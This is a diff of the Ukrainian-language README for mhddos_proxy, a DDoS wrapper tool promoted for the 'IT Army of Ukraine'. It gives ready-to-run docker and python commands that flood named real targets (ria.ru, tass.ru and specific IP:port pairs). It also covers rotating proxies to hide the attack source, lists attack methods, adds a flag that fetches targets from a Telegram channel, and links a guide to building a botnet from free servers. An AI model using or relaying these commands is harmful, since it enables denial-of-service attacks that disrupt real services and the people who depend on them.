@@ -1,20 +1,31 @@
-Скрипт-обгортка для запуску потужного DDoS інструмента [MHDDoS](https://github.com/MHProDev/MHDDoS).
+## DDoS Tool for IT Army of Ukraine 
 
-- **Не потребує VPN** - скачує і підбирає робочі проксі для атаки (доступний режим `--vpn` за бажанням)
-- Атака **декількох цілей** з автоматичним балансуванням навантаження
-- Використовує **різноманітні методи для атаки**
+- Вбудована база проксі для атаки з величезної кількості IP по всьому світу
+- Можливість задавати багато цілей з автоматичним балансуванням навантаження
+- Безліч різноманітних DDoS методів
+- Ефективне використання ресурсів завдяки асихронній архітектурі
 
 ### ⏱ Останні оновлення
+  
+Оновлення версії для Windows | Mac | Linux | Android | Docker: https://telegra.ph/Onovlennya-mhddos-proxy-04-16  
+
+- **18.05.2022**
+  - Додано налаштування `--copies` для запуску декількох копій (рекомендовано до використання при наявності 4+ CPU та мережі > 100 Mb/s).
+
+- **15.05.2022**
+  - Повністю оновлена асинхронна версія, що забезпечує максимальну ефективність та мінімальне навантаження на систему
+  - Ефективна робота зі значно більшими значеннями параметру `-t` (до 10k) без ризику "підвісити" усю машину
+  - Абсолютно новий алгоритм розподілення навантаження між цілями з метою досягнення максимальної потужності атаки
+  - Додано атаки `RGET`, `RHEAD`, `RHEX` та `STOMP`.
+
+<details>
+  <summary>📜 Раніше</summary>
 
 - **23.04.2022** 
   - Змінено прапорець `--vpn` - тепер ваш IP/VPN використовується **разом** із проксі, а не замість. Щоб досягти попередньої поведінки, використайте `--vpn 100`
 - **20.04.2022**
   - Значно покращене використання ресурсів системи для ефективної атаки
   - Додано параметр `--udp-threads` для контролю потужності UDP атак (за замовчуванням 1)
-
-<details>
-  <summary>📜 Раніше</summary>
-
 - **18.04.2022** 
   - В режимі `--debug` додано статистику "усього" по всіх цілях
   - Додано більше проксі
@@ -46,11 +57,11 @@
 
 ### 🕹 Запуск | Running (наведено різні варіанти цілей)
 
-#### Docker
+#### Docker (для Linux додавайте sudo на початку команди)
 
     docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477
 
-#### Python (якщо не працює - просто python замість python3)
+#### Python (якщо не працює - просто python або python3.10 замість python3)
 
     python3 runner.py https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477
 
@@ -58,19 +69,30 @@
 
 **Усі параметри можна комбінувати**, можна вказувати і до і після переліку цілей
 
-Змінити навантаження - `-t XXXX` - кількість потоків, за замовчуванням - CPU * 1000
+Змінити навантаження - `-t XXXX` - максимальна кількість одночасно відкритих зʼєднань, за замовченням - 1000 (якщо на машині одне CPU) або 7500 (якщо більше одного).  
+
+***Для Linux додавайте `sudo` на початку команди з docker***  
 
     docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 3000 https://ria.ru https://tass.ru
 
 Щоб переглянути інформацію про хід атаки, додайте прапорець `--table` для таблиці, `--debug` для тексту
 
     docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table https://ria.ru https://tass.ru
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --debug https://ria.ru https://tass.ru
+    
+Щоб атакувати цілі від https://t.me/itarmyofukraine2022 додайте параметр `--itarmy`  
+
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table --itarmy
+
+### 📌Автоматичний шукач нових проксі для mhddos_proxy
+Сам скрипт та інструкції по встановленню тут: https://github.com/porthole-ascend-cinnamon/proxy_finder
 
 ### 🐳 Комьюніті
-- [Детальний розбір MHDDoS_proxy](https://github.com/SlavaUkraineSince1991/DDoS-for-all/blob/main/MHDDoS_proxy.md)
-- [Utility for converting shared targets into config format](https://github.com/kobzar-darmogray/mhddos_proxy_utils)
+- [Детальний розбір mhddos_proxy та інструкції по встановленню](docs/installation.md)
 - [Аналіз засобу mhddos_proxy](https://telegra.ph/Anal%D1%96z-zasobu-mhddos-proxy-04-01)
 - [Приклад запуску через docker на OpenWRT](https://youtu.be/MlL6fuDcWlI)
+- [Створення ботнету з 30+ безкоштовних та автономних(працюють навіть при вимкненому ПК) Linux-серверів](https://auto-ddos.notion.site/dd91326ed30140208383ffedd0f13e5c)
+- [VPN](https://auto-ddos.notion.site/VPN-5e45e0aadccc449e83fea45d56385b54)
 
 ### CLI
 
@@ -82,6 +104,8 @@
                      [--vpn]
                      [--rpc RPC] 
                      [--http-methods METHOD [METHOD ...]]
+                     [--itarmy]
+                     [--copies COPIES]
 
     positional arguments:
       targets                List of targets, separated by space
@@ -94,34 +118,42 @@
       --debug                Print log as text
       --vpn                  Use both my IP and proxies for the attack. Optionally, specify a percent of using my IP (default is 10%)
       --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
-      --proxies URL|path     URL or local path to file with proxies to use
-      --udp-threads 1        Total number of threads to run for UDP sockets (defaults to 1)
+      --proxies URL|path     URL or local path(ex. proxies.txt) to file with proxies to use
       --http-methods GET     List of HTTP(s) attack methods to use (default is GET + POST|STRESS).
-                             Refer to MHDDoS docs for available options (https://github.com/MHProDev/MHDDoS)
+      --itarmy               Attack targets from https://t.me/itarmyofukraine2022  
+      --copies 1             Number of copies to run (default is 1)
 
 ### Власні проксі
 
 #### Формат файлу:
 
-    114.231.123.38:1234
-    114.231.123.38:3065:username:password
-    username:password@114.231.123.38:3065
-    socks5://114.231.155.38:5678
-    socks5://114.231.155.38:5678:username:password
-    socks4://username:password@114.231.123.38:3065
+    IP:PORT
+    IP:PORT:username:password
+    username:password@IP:PORT
+    protocol://IP:PORT
+    protocol://IP:PORT:username:password
+    protocol://username:password@IP:PORT
+де `protocol` може бути одним з 3-ох: http | socks4 | socks5, якщо `protocol`не вказувати, то буде обрано за замовчуванням - http  
+наприклад для публічного проксі: protocol=socks4 IP=114.231.123.38 PORT=3065 формат буде таким:  
+```shell
+socks4://114.231.123.38:3065
+```
+а для приватного: protocol=socks4 IP=114.231.123.38 PORT=3065 username=isdfuser password=ashd1spass формат може бути одним з таких:  
+```shell
+socks4://114.231.123.38:3065:isdfuser:ashd1spass
+socks4://isdfuser:ashd1spass@IP:PORT
+```
+  
+**URL - Віддалений файл для Python та Docker**
 
-#### Віддалений файл (однаково для Python та Docker)
-
-    python3 runner.py --proxies https://pastebin.com/raw/UkFWzLOt https://ria.ru
-
-#### Для Python
-
-Покладіть файл поруч з `runner.py` і додайте до команди наступний прапорець (замініть `proxies.txt` на ім'я свого файлу)
+    python3 runner.py https://tass.ru --proxies https://pastebin.com/raw/UkFWzLOt
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://tass.ru --proxies https://pastebin.com/raw/UkFWzLOt
+де https://pastebin.com/raw/UkFWzLOt - ваша веб-сторінка зі списком проксі (кожен проксі з нового рядка)  
+  
+**path - Для Python**  
+  
+Покладіть файл у папку з `runner.py` і додайте до команди наступний прапорець (замініть `proxies.txt` на ім'я свого файлу)
 
     python3 runner.py --proxies proxies.txt https://ria.ru
 
-#### Для Docker
-Потрібно монтувати volume щоби Docker мав доступ до файлу.  
-Обов'язково вказувати абсолютний шлях до файлу і не загубити `/` перед іменем файлу
-
-    docker run -it --rm --pull always -v /home/user/ddos/mhddos_proxy/proxies.txt:/proxies.txt ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --proxies /proxies.txt https://ria.ru
+де `proxies.txt` - ваша ваш файл зі списком проксі (кожен проксі з нового рядка)
